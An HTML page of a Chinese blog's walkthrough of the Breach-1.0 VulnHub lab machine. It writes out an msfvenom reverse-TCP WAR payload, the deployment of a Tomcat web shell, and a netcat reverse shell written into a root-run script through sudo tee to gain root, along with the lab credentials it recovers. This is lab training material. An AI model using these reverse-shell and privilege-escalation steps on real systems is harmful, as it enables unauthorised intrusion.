<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>kali渗透综合靶机(十五)--Breach-1.0靶机 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="kali渗透综合靶机(十五)--Breach-1.0靶机" />
<meta property="og:description" content="一、靶机下载 下载链接：https://download.vulnhub.com/breach/Breach-1.0.zip
二、Breach-1.0靶机搭建 将下载好的靶机环境，用VMware导入即可使用，文件-&gt;打开
导入到合适位置即可，默认是C盘，成功导入虚拟机之后，打开即可
三、攻击过程 VM虚机配置有静态IP地址（192.168.110.140），需要将虚拟机网卡设置为host-only方式组网。
kali IP：192.168.110.5
靶机IP：192.168.110.140
1、端口扫描 因IP地址固定，直接端口扫描
发现端口几乎全开放了，显然是有问题，虚拟机对端口扫描做了一些防护措施，直接访问80端口，进入web首页：http://192.168.110.140/
查看页面源码发现一串疑似base64加密的字符串
将其复制到Burpsuite Decoder进行base64解码，解密后发现还是base64编码，继续base64解码，得到：pgibbons:damnitfeel g o o d t o b e a g a n g goodtobeagang goodtobeagangta
发现图中的图片点击后就会跳转，跳转后如下图
查看页面源码,发现如下提示
尝试发现页面是否有有用的信息,发现点击下图,跳转到impresscms登录界面
尝试使用之前base64解密出来的疑似用户名密码的字符串,成功登录，用户名/密码：pgibbons/damnitfeel g o o d t o b e a g a n g goodtobeagang goodtobeagangta
发现cms大致版本信息,搜索引擎搜索是否有相关的漏洞
exploit-db.com查找impress cms漏洞：发现ImpressCMS 1.3.9 SQL注入漏洞, /modules/profile/admin/field.php,访问该页面一直302跳转，无法进行注入
发现收件箱Inbox显示有3封邮件，依次打开看
第三个邮件发现有一个文件被保存在192.168.110.140/.keystore
访问http://192.168.110.140/.keystore立马下载文件，下载包含SSL证书的密钥库keystore文件，keystore是存储公私密钥的一种文件格式
点击View Account菜单进入界面，再依次点击页面的Content，会弹出一行链接Content SSL implementation test capture，点击链接
点击完上图的链接,跳转到如下界面，可以看到一个名为：_SSL_test_phase1.pcap的Wireshark流量包文件，下载
用wireshark打开下载的pacp包,发现是包的内容经过SSL加密
查看keystore这个密匙库里面的所有证书
密码为tomcat" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/0b20c3dd0399ea6adef7c61469f33165/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-04-01T22:03:06+08:00" />
<meta property="article:modified_time" content="2020-04-01T22:03:06+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">kali渗透综合靶机(十五)--Breach-1.0靶机</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="_0"></a>一、靶机下载</h3> 
<p>下载链接：https://download.vulnhub.com/breach/Breach-1.0.zip</p> 
<h3><a id="Breach10_4"></a>二、Breach-1.0靶机搭建</h3> 
<p>将下载好的靶机环境，用VMware导入即可使用，文件-&gt;打开<br> <img src="https://images2.imgbox.com/db/ff/VeyWJQ2x_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/2a/eb/8kjOCPjp_o.png" alt="在这里插入图片描述"><br> 导入到合适位置即可，默认是C盘，成功导入虚拟机之后，打开即可<br> <img src="https://images2.imgbox.com/4d/ab/sxwLsqw9_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/89/a2/Gb35Cuv4_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_11"></a>三、攻击过程</h3> 
<p>VM虚机配置有静态IP地址（192.168.110.140），需要将虚拟机网卡设置为host-only方式组网。<br> kali IP：192.168.110.5<br> 靶机IP：192.168.110.140</p> 
<h3><a id="1_15"></a>1、端口扫描</h3> 
<p>因IP地址固定，直接端口扫描<br> <img src="https://images2.imgbox.com/3b/53/2UdEd8Gk_o.png" alt="在这里插入图片描述"><br> 发现端口几乎全开放了，显然是有问题，虚拟机对端口扫描做了一些防护措施，直接访问80端口，进入web首页：http://192.168.110.140/<br> <img src="https://images2.imgbox.com/3f/85/z9Qk8E8B_o.png" alt="在这里插入图片描述"><br> 查看页面源码发现一串疑似base64加密的字符串<br> <img src="https://images2.imgbox.com/27/b7/6RuupjI3_o.png" alt="在这里插入图片描述"><br> 将其复制到Burpsuite Decoder进行base64解码，解密后发现还是base64编码，继续base64解码，得到：pgibbons:damnitfeel<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         g 
        
       
         o 
        
       
         o 
        
       
         d 
        
       
         t 
        
       
         o 
        
       
         b 
        
       
         e 
        
       
         a 
        
       
         g 
        
       
         a 
        
       
         n 
        
       
         g 
        
       
      
        goodtobeagang 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em; vertical-align: -0.19444em;"></span><span class="mord mathdefault" style="margin-right: 0.03588em;">g</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right: 0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right: 0.03588em;">g</span></span></span></span></span>ta<br> <img src="https://images2.imgbox.com/7a/ab/msI7N0xn_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/64/cc/jXzDFd6Z_o.png" alt="在这里插入图片描述"><br> 发现图中的图片点击后就会跳转，跳转后如下图<br> <img src="https://images2.imgbox.com/5f/17/FoX5hzLI_o.png" alt="在这里插入图片描述"><br> 查看页面源码,发现如下提示<br> <img src="https://images2.imgbox.com/e4/47/RZ4py4VN_o.png" alt="在这里插入图片描述"><br> 尝试发现页面是否有有用的信息,发现点击下图,跳转到impresscms登录界面<br> <img src="https://images2.imgbox.com/ca/51/iWhSBdcq_o.png" alt="在这里插入图片描述"><br> 尝试使用之前base64解密出来的疑似用户名密码的字符串,成功登录，用户名/密码：pgibbons/damnitfeel<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         g 
        
       
         o 
        
       
         o 
        
       
         d 
        
       
         t 
        
       
         o 
        
       
         b 
        
       
         e 
        
       
         a 
        
       
         g 
        
       
         a 
        
       
         n 
        
       
         g 
        
       
      
        goodtobeagang 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em; vertical-align: -0.19444em;"></span><span class="mord mathdefault" style="margin-right: 0.03588em;">g</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right: 0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right: 0.03588em;">g</span></span></span></span></span>ta<br> <img src="https://images2.imgbox.com/b1/a8/Q8gcvEAM_o.png" alt="在这里插入图片描述"><br> 发现cms大致版本信息,搜索引擎搜索是否有相关的漏洞<br> <img src="https://images2.imgbox.com/f9/d2/oL3U8LMJ_o.png" alt="在这里插入图片描述"><br> exploit-db.com查找impress cms漏洞：发现ImpressCMS 1.3.9 SQL注入漏洞, /modules/profile/admin/field.php,访问该页面一直302跳转，无法进行注入<br> <img src="https://images2.imgbox.com/89/6e/DGEmcmDV_o.png" alt="在这里插入图片描述"><br> 发现收件箱Inbox显示有3封邮件，依次打开看<br> <img src="https://images2.imgbox.com/d1/cc/VOWiEhQd_o.png" alt="在这里插入图片描述"><br> 第三个邮件发现有一个文件被保存在192.168.110.140/.keystore<br> <img src="https://images2.imgbox.com/9f/db/rFEhp9B1_o.png" alt="在这里插入图片描述"><br> 访问http://192.168.110.140/.keystore立马下载文件，下载包含SSL证书的密钥库keystore文件，keystore是存储公私密钥的一种文件格式<br> <img src="https://images2.imgbox.com/1b/2c/K4hitzUm_o.png" alt="在这里插入图片描述"><br> 点击View Account菜单进入界面，再依次点击页面的Content，会弹出一行链接Content SSL implementation test capture，点击链接<br> <img src="https://images2.imgbox.com/7a/25/r6V5PBML_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/15/4b/KnGJoDwD_o.png" alt="在这里插入图片描述"><br> 点击完上图的链接,跳转到如下界面，可以看到一个名为：_SSL_test_phase1.pcap的Wireshark流量包文件，下载<br> <img src="https://images2.imgbox.com/f7/fc/WPwelN8t_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/61/3a/NOZy2ibB_o.png" alt="在这里插入图片描述"><br> 用wireshark打开下载的pacp包,发现是包的内容经过SSL加密<br> <img src="https://images2.imgbox.com/90/ab/haaxOLbF_o.png" alt="在这里插入图片描述"><br> 查看keystore这个密匙库里面的所有证书<br> 密码为tomcat<br> <img src="https://images2.imgbox.com/03/94/Ra8ZNNpb_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/f6/a1/Vyeo7q3C_o.png" alt="在这里插入图片描述"><br> keytool工具使用方法详情：https://www.iteye.com/blog/bjyzxxds-1052826<br> 从密钥库导出.p12证书：<br> <img src="https://images2.imgbox.com/94/be/0QdaZOO3_o.png" alt="在这里插入图片描述"><br> 默认打开流量包，发现很多TLS的<br> <img src="https://images2.imgbox.com/bd/be/cqu5DA0T_o.png" alt="在这里插入图片描述"><br> 将.p12证书导入wireshark<br> 在Wireshark中打开_SSL_test_phase1.pcap流量包文件，选择菜单：编辑–首选项–Protocols–SSL，点击右边的Edit<br> //最新版wireshark已经 把ssl 改为 tls，其实ssl/tls都已统称通信加密协议，所以就放一块了：<br> <img src="https://images2.imgbox.com/b7/20/Wikv5aOr_o.png" alt="在这里插入图片描述"><br> 注意：wireshark查看HTTPS数据包教程：http://www.dengb.com/bxjc/1369110.html<br> 因为数据包中是8443端口，所以设置8443端口</p> 
<p>导入ssl证书之后，部分TLS会变成http如下图<br> <img src="https://images2.imgbox.com/e8/2a/XLbhZVv5_o.png" alt="在这里插入图片描述"><br> 查看http数据包发现如下<br> <img src="https://images2.imgbox.com/e7/41/YYHDakWS_o.png" alt="在这里插入图片描述"><br> 访问https://192.168.110.140:8443/_M@nag3Me/html发现谷歌火狐浏览器均不能访问成功，因此开了burpsuite代理之后，访问成功了，发现是tomcat管理页面,需要登录<br> <img src="https://images2.imgbox.com/39/b2/osafmUvh_o.png" alt="在这里插入图片描述"><br> 发现tomcat采用采用http basic认证,认证数据包如下,wireshark自动解密tomcat:Tt\5D8F(#!*u=G)4m7zB<br> <img src="https://images2.imgbox.com/7b/7d/oTuni1Hy_o.png" alt="在这里插入图片描述"><br> 成功登录<br> <img src="https://images2.imgbox.com/67/50/op5AhjpX_o.png" alt="在这里插入图片描述"><br> Tomcat后台get shell是有标准姿势的，将caidao.jsp压缩成caidao.zip压缩包，再将zip压缩包将扩展名改为caidao.war，将war包上传部署即可：<br> <img src="https://images2.imgbox.com/55/fc/NeDnO2D0_o.png" alt="在这里插入图片描述"><br> 菜刀链接失败, 发现的问题：上传的菜刀马，一会儿就会消失，文件被删除，需要重新上传war包才能够继续使用菜刀，主机可能有杀软或者杀web shell工具。解决方法：bash反弹一个shell出来</p> 
<p>msf生成一个war格式的反弹shell</p> 
<p>msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.110.5 lport=6666 -f war -o test.war<br> <img src="https://images2.imgbox.com/bb/cb/1Lxydv1D_o.png" alt="在这里插入图片描述"><br> msf开启监听 use exploit/multi/handler<br> <img src="https://images2.imgbox.com/23/9e/vAdWsiEA_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/a9/c6/DBaXi5K6_o.png" alt="在这里插入图片描述"><br> tomcat后台上传test.war文件<br> <img src="https://images2.imgbox.com/f4/39/aqERQZjz_o.png" alt="在这里插入图片描述"><br> 访问https://192.168.110.140:8443/test/，等几秒，kali获得反弹shell<br> <img src="https://images2.imgbox.com/50/1a/uums4fQz_o.png" alt="在这里插入图片描述"><br> python -c ‘import pty;pty.spawn("/bin/bash")’<br> <img src="https://images2.imgbox.com/b2/62/meaMwcaB_o.png" alt="在这里插入图片描述"><br> 拿到shell之后,接下来便是提权了，收集主机信息,发现没有内核提权，在/etc/passwd发现milton 和 blumbergh用户<br> <img src="https://images2.imgbox.com/8f/c9/Uz2FE5Xt_o.png" alt="在这里插入图片描述"><br> 在网站发现如下内容<br> <img src="https://images2.imgbox.com/00/23/gu5pTh6a_o.png" alt="在这里插入图片描述"><br> 查看发现如下内容<br> <img src="https://images2.imgbox.com/54/77/4d1Rtc43_o.png" alt="在这里插入图片描述"><br> 登录mysql数据库,发现milton的密码<br> <img src="https://images2.imgbox.com/9f/d8/s9x82fH3_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/d1/76/LOuB5tIc_o.png" alt="在这里插入图片描述"><br> 解密 用户名密码milton/thelaststraw<br> <img src="https://images2.imgbox.com/6d/b3/3bVhDdF4_o.png" alt="在这里插入图片描述"><br> 登录milton，查看是否属于sudo组，没有什么发现　<br> <img src="https://images2.imgbox.com/16/58/2XDeYz7J_o.png" alt="在这里插入图片描述"><br> 接着查看历史命令，查找有价值的线索，看到历史命令su提权到了blumbergh用户。<br> 需要找到blumbergh用户的密码。</p> 
<p>在http://192.168.110.140/images/目录下发现六张图片<br> <img src="https://images2.imgbox.com/5a/d6/ZAIWFOOU_o.png" alt="在这里插入图片描述"><br> 将图片复制到kali linux，使用strings打印各图片其中的可打印字符，追加输出到images.txt，在vim下查看，密码在bill.png图片中，密码为coffeestains<br> <img src="https://images2.imgbox.com/89/ad/OFC20uEZ_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/d2/eb/REx9Dugk_o.png" alt="在这里插入图片描述"><br> 登录blumbergh<br> <img src="https://images2.imgbox.com/80/a9/RbMEZaaT_o.png" alt="在这里插入图片描述"><br> 查看历史命令，发现/usr/share/cleanup和tidyup.sh脚本文件：<br> <img src="https://images2.imgbox.com/b2/5e/FIPBAZI3_o.png" alt="在这里插入图片描述"><br> 读取tidyup.sh脚本分析：<br> <img src="https://images2.imgbox.com/e0/33/uDCjfmbA_o.png" alt="在这里插入图片描述"><br> cd /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</p> 
<p>这是一段清理脚本，描述中说明每3分钟执行清理，删除webapps目录下的文件，因此之前上传的菜刀马总是被删除，需要重新上传。查看tidyup.sh的权限，对该脚本没有写入权限，只有root可以<br> <img src="https://images2.imgbox.com/0c/65/Bg0X13U8_o.png" alt="在这里插入图片描述"><br> 查看sudo权限，执行sudo -l：<br> <img src="https://images2.imgbox.com/42/4f/Yk2uVMav_o.png" alt="在这里插入图片描述"><br> 发现用户能够以root权限执行这tee程序或tidyup.sh脚本：/usr/bin/tee和/usr/share/cleanup/tidyup.sh<br> tee命令用于读取标准输入的数据，并将其内容输出成文件。tidyup.sh是清理脚本。<br> <img src="https://images2.imgbox.com/e7/c1/RD84BVnL_o.png" alt="在这里插入图片描述"><br> 向tidyup.sh中写入反弹shell命令</p> 
<p>tidyup.sh文件只有root可写，而能够以root权限运行tee命令，那么用tee命令写tidyup.sh：先将反弹shell命令写入shell.txt文件，使用bash反弹shell命令没有成功，于是使用nc命令反弹shell成功，所以写nc反弹命令：<br> echo “nc -e /bin/bash 192.168.110.5 5555” &gt; shell.txt<br> 再使用tee命令将shell.txt内容输出到tidyup.sh<br> cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh<br> 查看tidyup.sh文件写入成功：<br> cat /usr/share/cleanup/tidyup.sh<br> <img src="https://images2.imgbox.com/d0/ba/ln5iyMwr_o.png" alt="在这里插入图片描述"><br> 经测试发现，只有在/home/blumbergh这个用户的目录下，才可以执行这三行命令，其余目录都提示没有执行权限，而且在切换账户时得加上su -。<br> su命令和su -命令区别：<br> su只是切换了root身份，但Shell环境仍然是普通用户的Shell；而su -连用户和Shell环境一起切换成root身份了。<br> 具体参考：https://www.cnblogs.com/dalaoban/p/9500353.html<br> <img src="https://images2.imgbox.com/a3/9b/NW5KBHy7_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/9a/48/qpkwhl6u_o.png" alt="在这里插入图片描述"><br> 更多web安全工具与存在漏洞的网站搭建源码，收集整理在知识星球。<br> <img src="https://images2.imgbox.com/0d/01/KpsOAxgI_o.jpg" alt="在这里插入图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/9d22eb5d8c221fd20368291f69e0c227/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">解决apt-get update时E: Unable to lock directory /var/lib/apt/lists的问题</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/de1a6a250460ccf4c9db495c5ee371b7/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">MySQL优化篇：SHOW语法</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>